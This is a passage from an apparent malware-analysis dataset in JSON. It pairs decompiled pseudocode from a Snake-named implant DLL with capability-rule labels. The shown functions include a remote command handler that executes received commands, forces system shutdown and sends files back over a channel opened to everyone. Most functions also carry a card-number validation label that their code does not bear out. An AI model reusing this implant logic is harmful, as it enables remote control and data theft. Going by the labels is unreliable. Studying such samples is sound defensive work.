        "decompiled_code": "\nvoid fcn.20006404(void)\n\n{\n    int32_t iVar1;\n    \n    fcn.200012c9(0x20046c68);\n    fcn.20001d55(0x20046c8c, 0);\n    fcn.20001d2f(0x20046c8c);\n    fcn.200012a9(0x20046c68);\n    if (*0x20046c88 != 0) {\n        fcn.20001567(0x20046c70);\n        iVar1 = 0;\n        do {\n            if (*(*0x20046c88 + iVar1) != 0) {\n                sym.inj_snake_Win32.dll_t_close(*0x20046c88 + iVar1, 0);\n            }\n            iVar1 = iVar1 + 0x1a0;\n        } while (iVar1 < 0x2080);\n        (*_sym.imp.msvcrt.dll_free)(*0x20046c88);\n        *0x20046c88 = 0;\n        fcn.2000157d(0x20046c70);\n    }\n    fcn.2000155c(0x20046c70);\n    return;\n}\n",
        "token_count": 270
    },
    "20006683": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.20006683(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    do {\n        if (*(iVar2 * 8 + 0x200341e0) == arg_ch) {\n            uVar1 = (**(iVar2 * 8 + 0x200341e4))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            return uVar1;\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x1f);\n    return 0x21590001;\n}\n",
        "token_count": 194
    },
    "200066c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.200066c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t var_10h;\n    \n    sub.ntdll.dll_memset(&var_10h, 0, 0x10);\n    var_10h = arg_ch;\n    iVar1 = sym.inj_snake_Win32.dll_qm_push(0xffffffff, 1, arg_8h, arg_10h, arg_14h, &var_10h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.200012e7(0x200471c0);\n        if (iVar1 != 0) {\n            fcn.200012c9(0x200471c0);\n        }\n        var_10h = 0;\n    }\n    else {\n        var_10h = iVar1 + 0x191U | 0x21590000;\n        iVar1 = sym.inj_snake_Win32.dll_qm_push(0xffffffff, 1, arg_8h, 0, 0, &var_10h);\n        if (iVar1 != 0) {\n            var_10h = iVar1 + 0x191U | 0x21590000;\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 304
    },
    "2000674b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2000674b(uint arg_8h, uint arg_ch, int32_t *arg_10h, uint *arg_14h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    puVar2 = sym.inj_snake_Win32.dll_tr_alloc(arg_ch, 0x14, 0);\n    if (puVar2 == NULL) {\n        *arg_10h = 0;\n        *arg_14h = 0;\n    }\n    else {\n        sub.ntdll.dll_memset(puVar2, 0, 0x14);\n        uVar3 = sym.inj_snake_Win32.dll_config_read_uint32(1, 0);\n        pcVar1 = _sym.imp.WS2_32.dll_htonl;\n        *puVar2 = uVar3;\n        puVar2[1] = arg_8h;\n        uVar3 = (*pcVar1)(uVar3);\n        *puVar2 = uVar3;\n        uVar3 = (*pcVar1)(puVar2[1]);\n        puVar2[1] = uVar3;\n        *arg_10h = puVar2;\n        *arg_14h = 0x14;\n    }\n    sym.inj_snake_Win32.dll_snake_log(6, arg_8h, 0, 0, 0);\n    return 0x215901f4;\n}\n",
        "token_count": 324
    },
    "20006a7e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.20006a7e(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar3 = 0;\n    var_4h = 0;\n    iVar2 = sym.inj_snake_Win32.dll_qm_enum(arg_8h, arg_ch, &var_8h, &var_4h);\n    if (iVar2 == 0) {\n        if (var_8h != 0) {\n            iVar2 = 0;\n            do {\n                uVar1 = *(var_4h + iVar2 + 0xc);\n                if ((arg_10h <= uVar1) && (-1 < uVar1)) {\n                    *(var_4h + iVar2 + 4) = 0xffffffff;\n                }\n                uVar3 = uVar3 + 1;\n                iVar2 = iVar2 + 0x40;\n            } while (uVar3 < var_8h);\n        }\n        sym.inj_snake_Win32.dll_qm_rm_list(var_4h, var_8h);\n        sym.inj_snake_Win32.dll_qm_free(var_4h);\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = iVar2 + 0x191U | 0x21590000;\n    }\n    return uVar3;\n}\n",
        "token_count": 343
    },
    "20006bc6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.20006bc6(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar5 = 0;\n    uVar3 = 0;\n    if (*0x20046c88 == 0) {\n        uVar3 = 0;\n    }\n    else {\n        fcn.20001567(0x20046c70);\n        iVar4 = 0;\n        do {\n            if (((*(*0x20046c88 + iVar5) != 0) &&\n                (iVar1 = sub.ntdll.dll_strcmp(*0x20046c88 + iVar5 + 1, param_1),  iVar1 == 0)) &&\n               (iVar1 = sub.ntdll.dll_strcmp(iVar5 + 0x84 + *0x20046c88, param_1 + 0x80),  iVar1 == 0)) {\n                puVar2 = *0x20046c88 + iVar4 * 0x1a0;\n                uVar3 = *puVar2;\n                *puVar2 = 0;\n                break;\n            }\n            iVar5 = iVar5 + 0x1a0;\n            iVar4 = iVar4 + 1;\n        } while (iVar5 < 0x2080);\n        fcn.2000157d(0x20046c70);\n    }\n    return uVar3;\n}\n",
        "token_count": 328
    },
    "20006c59": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20006c59(int32_t arg_8h, uint s2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if ((arg_8h != 0) && (*0x20046c88 != NULL)) {\n        fcn.20001567(0x20046c70);\n        iVar3 = 0;\n        piVar2 = *0x20046c88;\n        do {\n            if (*piVar2 == 0) {\n                piVar2 = *0x20046c88 + iVar3 * 0x68;\n                *piVar2 = arg_8h;\n                sub.ntdll.dll_memcpy(piVar2 + 1, s2, 0x195);\n                iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*0x20046c88)[iVar3 * 0x68 + 0x67] = iVar1;\n                arg_8h = 0;\n                break;\n            }\n            iVar3 = iVar3 + 1;\n            piVar2 = piVar2 + 0x68;\n        } while (iVar3 < 0x14);\n        fcn.2000157d(0x20046c70);\n        if (arg_8h != 0) {\n            sym.inj_snake_Win32.dll_t_close(&arg_8h, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 321
    },
    "200078ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.200078ea(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_1h;\n    \n    var_1h._0_1_ = '\\0';\n    fcn.2000d5bb(arg_10h, 0x32, 1, &var_1h, 1);\n    iVar1 = fcn.20001cfb(&var_ch, 0x20006b74, -(var_1h != '\\0') & &var_1h);\n    if (iVar1 != 0) {\n        return 0x215901ff;\n    }\n    fcn.20001d2f(&var_ch);\n    return 0;\n}\n",
        "token_count": 199
    },
    "2000793f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.2000793f(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    iVar1 = fcn.20001cfb(&var_8h, 0x20006ba2, 0);\n    if (iVar1 != 0) {\n        return 0x215901ff;\n    }\n    fcn.20001d2f(&var_8h);\n    return 0;\n}\n",
        "token_count": 97
    },
    "20007ba8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20007ba8(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_10h;\n    \n    iVar1 = sym.inj_snake_Win32.dll_qm_find_first(0xfffffffe, 2, &arg_10h, &var_40h);\n    if (iVar1 == 0) {\n        if (var_10h != arg_ch) {\n            return -1;\n        }\n        iVar1 = sym.inj_snake_Win32.dll_qm_read(0xfffffffe, 2, var_3ch, 0, arg_8h, arg_ch, &arg_ch);\n    }\n    return iVar1;\n}\n",
        "token_count": 181
    },
    "20007bee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20007bee(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_14h;\n    uint var_4h;\n    \n    var_4h = 0x229;\n    iVar1 = sym.inj_snake_Win32.dll_qm_find_first(0xfffffffd, 2, &var_4h, &var_44h);\n    if (iVar1 == 0) {\n        if (var_14h != arg_ch) {\n            return -1;\n        }\n        iVar1 = sym.inj_snake_Win32.dll_qm_read(0xfffffffd, 2, var_40h, 0, arg_8h, arg_ch, &arg_ch);\n    }\n    return iVar1;\n}\n",
        "token_count": 192
    },
    "20007f98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.20007f98(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint var_42ch;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 3;\n    iVar2 = sym.inj_snake_Win32.dll_qm_enum(0xfffffffe, 2, &var_14h, &arg_14h);\n    iVar6 = 0;\n    if (iVar2 == 0) {\n        sub.ntdll.dll_memset(&var_2ch, 0, 0x10);\n        var_2ch = 0x15;\n        var_28h = 3;\n        var_24h = 0x16;\n        var_20h = 200;\n        sub.ntdll.dll_memset(&var_10h, 0, 0x10);\n        var_ch = &var_2ch;\n        var_10h = 2;\n        var_4h = (*_sym.imp.msvcrt.dll_calloc)(0x10, var_14h);\n        if (var_4h == 0) {\n            uVar3 = 0x21590004;\n        }\n        else {\n            var_18h = 0;\n            if (var_14h != 0) {\n                do {\n                    iVar2 = *(iVar6 + 0xc + arg_14h);\n                    if (((iVar2 != 0x227) && (iVar2 != 0x228)) && (iVar2 != 0x229)) {\n                        iVar4 = sym.inj_snake_Win32.dll_config_read(iVar2, &var_42ch, 0x400, &var_1ch);\n                        iVar2 = var_1ch;\n                        if (iVar4 == 0) {\n                            puVar5 = (*_sym.imp.msvcrt.dll_malloc)(var_10h * 0x10 + var_1ch);\n                            if (puVar5 != NULL) {\n                                sub.ntdll.dll_memset(puVar5, 0, var_10h << 4);\n                                *puVar5 = 4;\n                                puVar5[1] = puVar5 + 2;\n                                puVar5[2] = *(iVar6 + 0xc + arg_14h);\n                                puVar5[4] = iVar2;\n                                puVar5[5] = puVar5 + var_10h * 4;\n                                sub.ntdll.dll_memcpy(puVar5 + var_10h * 4, &var_42ch, iVar2);\n                                *(var_4h + var_8h * 4) = puVar5;\n                                var_8h = var_8h + 1;\n                            }\n                        }\n                    }\n                    var_18h = var_18h + 1;\n                    iVar6 = iVar6 + 0x40;\n                } while (var_18h < var_14h);\n            }\n            uVar3 = sym.inj_snake_Win32.dll_code_result_tbl(&var_10h, arg_18h, arg_1ch);\n            pcVar1 = _sym.imp.msvcrt.dll_free;\n            uVar7 = 0;\n            if (var_8h != 0) {\n                do {\n                    (*pcVar1)(*(var_4h + uVar7 * 4));\n                    uVar7 = uVar7 + 1;\n                } while (uVar7 < var_8h);\n            }\n            (*pcVar1)(var_4h);\n        }\n        sym.inj_snake_Win32.dll_qm_free(arg_14h);\n    }\n    else {\n        uVar3 = iVar2 + 0x191U | 0x21590000;\n    }\n    return uVar3;\n}\n",
        "token_count": 976
    },
    "20008147": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.20008147(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.2000d5bb(arg_10h, 0x13, 3, &var_8h, 4);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    iVar1 = fcn.2000d580(arg_10h, 0x14, 4, &var_4h, &var_ch);\n    if (iVar1 == 0) {\n        return 0x21590066;\n    }\n    uVar2 = fcn.20001f33(var_4h, 0x200471e0);\n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)(uVar2);\n    if (iVar1 == 0) {\n        uVar4 = 0x21590004;\n    }\n    else {\n        fcn.20001e44(var_4h, iVar1, 0xffffffff, 0x200471e0);\n        iVar3 = sub.ntdll.dll_strlen(iVar1);\n        iVar3 = sym.inj_snake_Win32.dll_config_write(var_8h, iVar1, iVar3 + 1);\n        uVar4 = -(iVar3 != 0) & 0x215901fb;\n        (*_sym.imp.msvcrt.dll_free)(iVar1);\n    }\n    return uVar4;\n}\n",
        "token_count": 372
    },
    "2000822a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2000822a(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint var_20h;\n    uint *var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 3;\n    iVar6 = 0;\n    var_4h = 0;\n    iVar3 = sym.inj_snake_Win32.dll_qm_enum(0xfffffffe, 5, &var_10h, &var_4h);\n    if (iVar3 != 0) {\n        return iVar3 + 0x191U | 0x21590000;\n    }\n    sub.ntdll.dll_memset(&var_20h, 0, 0x10);\n    pcVar2 = _sym.imp.msvcrt.dll_calloc;\n    var_20h = 2;\n    var_1ch = (*_sym.imp.msvcrt.dll_calloc)(2, 8);\n    if (var_1ch == NULL) {\n        uVar8 = 0x21590004;\n    }\n    else {\n        *var_1ch = 1;\n        var_1ch[1] = 8;\n        var_1ch[2] = 0x14;\n        var_1ch[3] = 200;\n        var_18h = var_10h;\n        var_14h = (*pcVar2)(var_10h, 4);\n        if (var_14h == 0) {\n            uVar8 = 0x21590004;\n            goto code_r0x20008429;\n        }\n        var_8h = 0;\n        if (var_18h != 0) {\n            do {\n                iVar3 = var_8h * 4;\n                uVar4 = (*pcVar2)(var_20h, 0x10);\n                *(iVar3 + var_14h) = uVar4;\n                if (*(var_14h + iVar3) == 0) {\n                    uVar8 = 0x21590004;\n                    goto code_r0x200083ea;\n                }\n                iVar5 = *(var_14h + iVar3);\n                *(iVar5 + 4) = iVar5 + 8;\n                **(iVar3 + var_14h) = 4;\n                **(*(iVar3 + var_14h) + 4) = *(iVar6 + 0x20 + var_4h);\n                *(*(iVar3 + var_14h) + 0x14) = *(iVar3 + var_14h) + 0x18;\n                *(*(iVar3 + var_14h) + 0x10) = 1;\n                **(*(iVar3 + var_14h) + 0x14) = 0;\n                iVar5 = sym.inj_snake_Win32.dll_local_queue_read(5, *(iVar6 + 4 + var_4h), 0, 0, &arg_14h, 1);\n                if ((iVar5 == 0) && (var_ch = (*_sym.imp.msvcrt.dll_malloc)(arg_14h),  var_ch != 0)) {\n                    iVar5 = sym.inj_snake_Win32.dll_local_queue_read\n                                      (5, *(iVar6 + 4 + var_4h), var_ch, arg_14h, &arg_14h, 1);\n                    if (iVar5 == 0) {\n                        *(*(iVar3 + var_14h) + 0x14) = var_ch;\n                        *(*(iVar3 + var_14h) + 0x10) = arg_14h;\n                    }\n                    else {\n                        (*_sym.imp.msvcrt.dll_free)(var_ch);\n                    }\n                }\n                var_8h = var_8h + 1;\n                iVar6 = iVar6 + 0x40;\n            } while (var_8h < var_18h);\n        }\n        uVar8 = sym.inj_snake_Win32.dll_code_result_tbl(&var_20h, arg_18h, arg_1ch);\n    }\ncode_r0x200083ea:\n    if ((var_14h != 0) && (uVar7 = 0,  var_18h != 0)) {\n        do {\n            piVar1 = var_14h + uVar7 * 4;\n            if (*piVar1 != 0) {\n                iVar3 = *piVar1;\n                if (*(iVar3 + 0x14) != iVar3 + 0x18) {\n                    (*_sym.imp.msvcrt.dll_free)(*(iVar3 + 0x14));\n                }\n                (*_sym.imp.msvcrt.dll_free)(*(var_14h + uVar7 * 4));\n            }\n            uVar7 = uVar7 + 1;\n        } while (uVar7 < var_18h);\n    }\ncode_r0x20008429:\n    pcVar2 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(var_1ch);\n    (*pcVar2)(var_14h);\n    sym.inj_snake_Win32.dll_qm_free(var_4h);\n    return uVar8;\n}\n",
        "token_count": 1273
    },
    "20008454": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.20008454(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_8h = 0;\n    iVar1 = fcn.2000d5bb(arg_10h, 0x12, 2, &var_4h, 4);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    iVar1 = sym.inj_snake_Win32.dll_qm_enum(0xfffffffe, 5, &var_ch, &var_8h);\n    if (iVar1 != 0) {\n        return iVar1 + 0x191U | 0x21590000;\n    }\n    if (var_ch < var_4h) {\n        var_4h = var_ch;\n    }\n    sym.inj_snake_Win32.dll_qm_rm_list(var_8h, var_4h);\n    sym.inj_snake_Win32.dll_qm_free(var_8h);\n    return 0;\n}\n",
        "token_count": 261
    },
    "200084c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.200084c7(uint arg_8h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *in_ECX;\n    uint s;\n    uint NewState;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    char *endptr;\n    uint lpLuid;\n    uint var_10h;\n    int32_t TokenHandle;\n    uchar var_5h;\n    int32_t size;\n    \n    cVar1 = *in_ECX;\n    if (cVar1 == '&') {\n        uVar3 = (*_sym.imp.ntdll.dll_strtoul)(in_ECX + 1, &endptr, 0);\n        if (((*endptr == '\\0') &&\n            (iVar4 = sym.inj_snake_Win32.dll_local_queue_read(3, uVar3, 0, 0, &size, 0),  iVar4 == 0)) &&\n           (iVar4 = (*_sym.imp.msvcrt.dll_malloc)(size),  iVar4 != 0)) {\n            iVar5 = sym.inj_snake_Win32.dll_local_queue_read(3, uVar3, iVar4, size, &size, 0);\n            if (iVar5 == 0) {\n                fcn.20013589(arg_8h, &size, 4, 0);\n                fcn.20013589(arg_8h, iVar4, size, 0);\n            }\n            (*_sym.imp.msvcrt.dll_free)(iVar4);\n        }\n    }\n    else if (((cVar1 == ':') || (cVar1 == '!')) || (cVar1 == '~')) {\n        if (cVar1 == '!') {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n            iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n            if ((iVar4 != 0) &&\n               (iVar4 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueW)(0, 0x2002d534, &lpLuid),  iVar4 != 0)) {\n                var_24h = lpLuid;\n                var_20h = var_10h;\n                NewState = 1;\n                var_1ch = 2;\n                iVar4 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n                if (iVar4 != 0) {\n                    (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0x10007);\n                }\n            }\n        }\n        else if (cVar1 == ':') {\n            (*_sym.imp.KERNEL32.dll_WinExec)(in_ECX + 1, 0);\n        }\n        else if (cVar1 == '~') {\n            var_5h = 1;\n            fcn.20001cfb(&lpLuid, 0x20006b74, &var_5h);\n            fcn.20001d2f(&lpLuid);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        (*_sym.imp.ntdll.dll_sprintf)(&s, 0x2002d530, uVar3);\n        size = sub.ntdll.dll_strlen(&s);\n        fcn.20013589(arg_8h, &size, 4, 0);\n        fcn.20013589(arg_8h, &s, size, 0);\n    }\n    else {\n        iVar4 = (*_sym.imp.msvcrt.dll_fopen)();\n        if (iVar4 != 0) {\n            TokenHandle = iVar4;\n            uVar3 = (*_sym.imp.msvcrt.dll__fileno)(iVar4);\n            size = (*_sym.imp.msvcrt.dll__filelength)(uVar3);\n            fcn.20013589(arg_8h, &size, 4, 0);\n            pcVar2 = _sym.imp.msvcrt.dll_fread;\n            size = (*_sym.imp.msvcrt.dll_fread)(&s, 1, 0x400, iVar4);\n            while (size != 0) {\n                fcn.20013589(arg_8h, &s, size, 0);\n                size = (*pcVar2)(&s, 1, 0x400, TokenHandle);\n            }\n            (*_sym.imp.msvcrt.dll_fclose)(TokenHandle);\n        }\n    }\n    return;\n}\n",
        "token_count": 1023
    },
    "20008714": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20008714(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    char *var_4h;\n    \n    iVar1 = fcn.200135e2(arg_8h, &var_4h, &var_8h, 20000, 0);\n    if (iVar1 == 0) {\n        if ((*var_4h == '$') && (iVar1 = sym.inj_snake_Win32.dll_config_read_uint32(4, 0),  iVar1 == 0)) {\n            fcn.20013299(arg_8h, var_4h);\n            fcn.20013237(&arg_8h, 0);\n            return 0;\n        }\n        sym.inj_snake_Win32.dll_local_queue_write(5, 0, var_4h, var_8h, 0, 0);\n        fcn.20013299(arg_8h, var_4h);\n        iVar1 = fcn.200135e2(arg_8h, &var_4h, &var_8h, 20000, 0);\n        if (iVar1 == 0) {\n            fcn.200084c7(arg_8h);\n            fcn.20013299(arg_8h, var_4h);\n        }\n    }\n    fcn.20013237(&arg_8h, 0);\n    return 0;\n}\n",
        "token_count": 320
    },
    "200087d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.200087d0(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_4h;\n    \n    while (iVar1 = fcn.20013311(*0x20046cac, &var_4h, 0),  iVar1 == 0) {\n        iVar1 = fcn.20001cfb(&var_ch, fcn.20008714, var_4h);\n        if (iVar1 == 0) {\n            fcn.20001d2f(&var_ch);\n        }\n        else {\n            fcn.20013237(&var_4h, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 149
    },
    "20008828": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.20008828(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_18h;\n    uint arg_1ch;\n    uint arg_20h;\n    uint s;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0x2002d580;\n    var_ch = 0;\n    fcn.20009c95(&s, 0x52);\n    arg_20h = 1;\n    arg_1ch = 0;\n    arg_18h = 0;\n    iVar1 = sub.ntdll.dll_strlen(&s);\n    var_8h = fcn.2001300b(0x20046cac, &var_10h, &s, iVar1 + 1, arg_18h, arg_1ch, arg_20h);\n    if (var_8h == 0) {\n        var_8h = fcn.20013534(*0x20046cac, \"allow=*everyone\", 0);\n        if (var_8h == 0) {\n            var_4h = 0;\n            iVar1 = 0x20046c94;\n            do {\n                iVar2 = fcn.20001cfb(iVar1, fcn.200087d0, 0);\n                if (iVar2 == 0) {\n                    var_4h = var_4h + 1;\n                }\n                else {\n                    var_8h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                }\n                iVar1 = iVar1 + 8;\n            } while (iVar1 < 0x20046cac);\n            if (var_4h != 0) {\n                return 0;\n            }\n        }\n        fcn.20013237(0x20046cac, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 430
    },
    "200088de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200088de(uint arg_8h, uint ap)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t unaff_EDI;\n    uint format;\n    \n    if (in_ECX == 0) {\n        iVar1 = -1;\n    }\n    else {\n        iVar1 = (*_sym.imp.ntdll.dll__vsnprintf)();\n        *(unaff_EDI + -1 + in_ECX) = 0;\n    }\n    if (iVar1 < 0) {\n        iVar2 = (*_sym.imp.msvcrt.dll_fopen)(0x2002d4d0, 0x2002d4d4);\n        if (iVar2 != 0) {\n            iVar1 = (*_sym.imp.msvcrt.dll_vfprintf)(iVar2, arg_8h, &ap);\n            (*_sym.imp.msvcrt.dll_fclose)(iVar2);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 222
    },
    "20008954": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.20008954(int32_t param_1, uint param_2)\n\n{\n    uint envp;\n    uint argv;\n    \n    argv = *(param_1 + 4);\n    envp = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    main(envp, argv, param_2);\n    return;\n}\n",
        "token_count": 74
    },
    "200089b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.200089b0(uint param_1, uint param_2)\n\n{\n    uint arg_8h;\n    \n    arg_8h = fcn.20008999();\n    fcn.2000ec72(arg_8h, param_1, param_2);\n    return;\n}\n",
        "token_count": 66
    },
    "200089c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.200089c7(uint param_1, uint param_2)\n\n{\n    uint arg_8h;\n    \n    arg_8h = fcn.20008999();\n    fcn.2000f1b4(arg_8h, param_1, param_2);\n    return;\n}\n",
        "token_count": 68
    },
    "20008a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.20008a20(int32_t param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint arg_8h;\n    \n    arg_8h = fcn.20008999();\n    *(param_1 + 0x11c) = arg_8h;\n    *(param_1 + 0x118) = 1;\n    fcn.200105cc(arg_8h, param_2, param_3, param_4, param_1 + 4);\n    return;\n}\n",
        "token_count": 121
    },
    "20008ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
